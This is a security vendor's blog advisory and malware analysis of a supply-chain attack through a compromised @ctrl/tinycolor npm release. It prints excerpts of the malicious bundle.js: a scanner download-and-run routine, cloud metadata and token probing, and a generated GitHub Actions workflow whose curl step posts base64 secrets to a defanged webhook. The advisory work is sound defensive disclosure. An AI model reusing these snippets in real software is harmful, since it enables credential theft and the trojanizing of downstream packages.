---
author: Socket
cover_image: >-
  https://cdn.sanity.io/images/cgdhsj6q/production/49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png?w=1000&q=95&fit=max&auto=format
date: '2025-09-16T11:19:56.090Z'
dateFolder: 2025/09/16
description: >-
  Malicious update to @ctrl/tinycolor on npm is part of a supply-chain attack
  hitting 40+ packages across maintainers
isBasedOn: 'https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages'
link: 'https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages'
slug: 2025-09-16-httpssocketdevblogtinycolor-supply-chain-attack-affects-40-packages
tags:
  - tech
  - infosec
title: >-
  Popular Tinycolor npm Package Compromised in Supply Chain Attack Affecting 40+
  Packages
---
<figure><img alt="Popular Tinycolor npm Package Compromised in Supply Chain Attack Affecting 40+ Packages" data-nimg="fill" sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 45vw" src="https://socket.dev/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=3840&amp;q=75" srcset="https://socket.dev/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=384&amp;q=75%20384w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=640&amp;q=75%20640w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=750&amp;q=75%20750w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=828&amp;q=75%20828w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=1080&amp;q=75%201080w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=1200&amp;q=75%201200w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=1920&amp;q=75%201920w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=2048&amp;q=75%202048w,%20/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fcgdhsj6q%2Fproduction%2F49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png%3Fw%3D1600%26q%3D95%26fit%3Dmax%26auto%3Dformat&amp;w=3840&amp;q=75%203840w"/></figure>
<p>A malicious update to <code>@ctrl/tinycolor</code> was detected on npm as part of a broader supply-chain attack that impacted more than 40 packages spanning multiple maintainers. The compromised versions include a function (<code>NpmModule.updatePackage</code>) that downloads a package tarball, modifies <code>package.json</code>, injects a local script (<code>bundle.js</code>), repacks the archive, and republishes it, enabling automatic trojanization of downstream packages.</p>
<p>The issue was first noticed by <a href="https://www.linkedin.com/in/daniel-pereira-b17a27160/">Daniel dos Santos Pereira</a>, who flagged suspicious behavior in the latest release. Socket’s automated malware detection also surfaced the threat in 40+ additional packages, and our research team is analyzing the payload and its distribution method. We will publish a full technical report once analysis is complete.</p>
<figure><img alt=" " src="https://cdn.sanity.io/images/cgdhsj6q/production/cd7bd69598078022c0cd3f02f507826a53350721-619x785.png?w=1600&amp;q=95&amp;fit=max&amp;auto=format"/></figure>
<h3>Compromised Packages and Versions</h3>
<p>The following npm packages and versions have been confirmed as affected:</p>
<h2>Malware Analysis</h2>
<p>The <code>bundle.js</code> script downloads and executes TruffleHog, a legitimate secret scanner, then searches the host for tokens and cloud credentials. It validates and uses developer and CI credentials, creates a GitHub Actions workflow inside repositories, and exfiltrates results to a hardcoded webhook (<code>hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</code>).</p>
<p>The script runs automatically when the package is installed.</p>
<figure><img alt=" " src="https://cdn.sanity.io/images/cgdhsj6q/production/e00e84d58ab56de42809905f86cc8b4c2a7a8648-996x90.png?w=1600&amp;q=95&amp;fit=max&amp;auto=format"/></figure>
<p>The referenced <code>bundle.js</code> is a large, minified file that functions as a controller. It profiles the platform, fetches a matching TruffleHog binary, and executes it to search for high entropy strings and known credential patterns across the filesystem and repositories.</p>
<pre><code>// De-minified transcription from bundle.js
const { execSync } = require("child_process");
const os = require("os");

function trufflehogUrl() {
  const plat = os.platform();
  if (plat === "win32") return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_windows_x86_64.zip";
  if (plat === "linux") return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_linux_x86_64.tar.gz";
  return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_darwin_all.tar.gz";
}

function runScanner(binaryPath, targetDir) {
  // Executes downloaded scanner against local paths
  const cmd = `"${binaryPath}" filesystem "${targetDir}" --json`;
  const out = execSync(cmd, { stdio: "pipe" }).toString();
  return JSON.parse(out); // Parsed findings contain tokens and secrets
}</code></pre>
<p>The controller also includes a bash block that uses a GitHub personal access token if present, writes a GitHub Actions workflow into <code>.github/workflows</code>, and exfiltrates collected content to a webhook.</p>
<pre><code># Extracted from a literal script block inside bundle.js
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

# Minimal exfil step inside the generated workflow
# Note: defanged URL for safety
run: |
  CONTENTS="$(cat findings.json | base64 -w0)"
  curl -s -X POST -d "$CONTENTS" "hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"</code></pre>
<h3>Stealing Secrets</h3>
<p>The script combines local scanning with service specific probing. It looks for environment variables such as <code>GITHUB_TOKEN</code>, <code>NPM_TOKEN</code>, <code>AWS_ACCESS_KEY_ID</code>, and <code>AWS_SECRET_ACCESS_KEY</code>. It validates npm tokens with the <code>whoami</code> endpoint, and it interacts with GitHub APIs when a token is available. It also attempts cloud metadata discovery that can leak short lived credentials inside cloud build agents.</p>
<pre><code>// Key network targets inside the bundle
const imdsV4 = "http://169[.]254[.]169[.]254";          // AWS instance metadata
const imdsV6 = "http://[fd00:ec2::254]";                // AWS metadata over IPv6
const gcpMeta = "http://metadata[.]google[.]internal";  // GCP metadata

// npm token verification
fetch("https://registry.npmjs.org/-/whoami", {
  headers: { "Authorization": `Bearer ${process.env.NPM_TOKEN}` }
});

// GitHub API use if GITHUB_TOKEN is present
fetch("https://api.github.com/user", {
  headers: { "Authorization": `token ${process.env.GITHUB_TOKEN}` }
});
</code></pre>
<p>The workflow that it writes to repositories persists beyond the initial host. Once committed, any future CI run can trigger the exfiltration step from within the pipeline where sensitive secrets and artifacts are available by design.</p>
<h3>Indicators of Compromise</h3>
<ul><li><code>bundle.js</code> SHA-256: <code>46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09</code></li><li>Exfiltration endpoint: <code>hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</code></li></ul>
<h3>Immediate Guidance</h3>
<ul><li><strong>Uninstall or pin to known-good versions</strong> until patched releases are verified.</li><li><strong>Audit environments</strong> (CI/CD agents, developer laptops) that installed the affected versions for unauthorized publishes or credential theft.</li><li><strong>Rotate npm tokens and other exposed secrets</strong> if these packages were present on machines with publishing credentials.</li><li>Monitor logs for unusual <code>npm publish</code> or package modification events.</li></ul>
<p>A full technical analysis of the malware, its propagation method, and remediation guidance will follow as our investigation progresses.</p>
